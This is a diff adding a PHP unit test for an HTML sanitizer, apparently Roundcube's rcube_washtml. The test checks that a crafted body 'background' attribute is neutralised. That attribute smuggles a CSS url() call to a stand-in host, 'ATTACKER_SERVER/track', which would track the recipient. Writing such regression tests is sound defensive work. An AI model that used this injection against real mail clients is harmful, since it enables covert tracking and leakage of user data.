@@ -271,6 +271,13 @@ class WashtmlTest extends TestCase
         $this->assertMatchesRegularExpression('|link="#111"|', $washed, 'Body link attribute');
         $this->assertMatchesRegularExpression('|alink="#222"|', $washed, 'Body alink attribute');
         $this->assertMatchesRegularExpression('|vlink="#333"|', $washed, 'Body vlink attribute');
+
+        $html = '<html><body background="data:image/png,x);background:url(//ATTACKER_SERVER/track?uid=test"></body></html>';
+
+        $washer = new \rcube_washtml(['html_elements' => ['body']]);
+        $washed = $washer->wash($html);
+
+        $this->assertMatchesRegularExpression('|x-washed="background"|', $washed, 'Body evil background');
     }
 
     /**
